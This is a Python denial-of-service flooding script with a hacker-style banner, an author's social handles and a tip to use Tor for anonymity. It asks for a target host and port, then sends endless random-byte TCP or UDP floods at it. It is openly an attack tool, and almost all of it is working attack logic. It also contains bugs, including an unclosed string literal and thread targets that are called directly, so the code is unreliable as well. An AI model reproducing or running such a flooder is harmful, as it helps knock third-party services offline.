import threading
import os
import random as rnd 
import socket
import time
bytes = rnd._urandom(1490)
os.system('clear')
print('''

    ____  ____  _____       __  __                        __    
   / __ \/ __ \/ ___/      / /_/ /_  ________  ____ _____/ /____
  / / / / / / /\__ \______/ __/ __ \/ ___/ _ \/ __ `/ __  / ___/
 / /_/ / /_/ /___/ /_____/ /_/ / / / /  /  __/ /_/ / /_/ (__  ) 
/_____/\____//____/      \__/_/ /_/_/   \___/\__,_/\__,_/____/  
                                                                

''')
print('		‹'+'—'*20+'(Hacking kro pyaar ni)'+'—'*20+'›')
print('Author	 : king')
print('Instagram : the.empiresec')
print('github	 : https://www.github.com/the.EmpireSec)
print('Note : Use tor for anonymity\n')
host=input('[+] Enter target ip/domain >> ')
port = int(input('[+] Enter an open port no. >> '))

def attack_via_tcp():
    global port
    sent = 0
    while True :
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        s.sendto(bytes, (host,port))
        sent = sent + 1
        print('Send {0} packets to {1} through port {2}'.format(sent,host,port))
        s.close()
def attack_via_udp():
    sent = 0
    global port
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    while True:
        s.sendto(bytes, (host,port))
        sent = sent + 1
        port = port + 1
        print('Send {0} packets to {1} through port {2}'.format(sent,host,port))
        if port == 65534:
            port=1
os.system('clear')
print('         [1] -----> TCP connection base dos')
print('         [2] -----> UDP connection base dos')
k=input('[+] Enter option no. >> ')
if k=='1':
	for i in range(10000):
		t1=threading.Thread(target=attack_via_tcp())
		t1.start()
elif k=='2':
	for j in range(10000):
		t2=threading.Thread(target=attack_via_udp())
else:
	print('Invalid Choice')
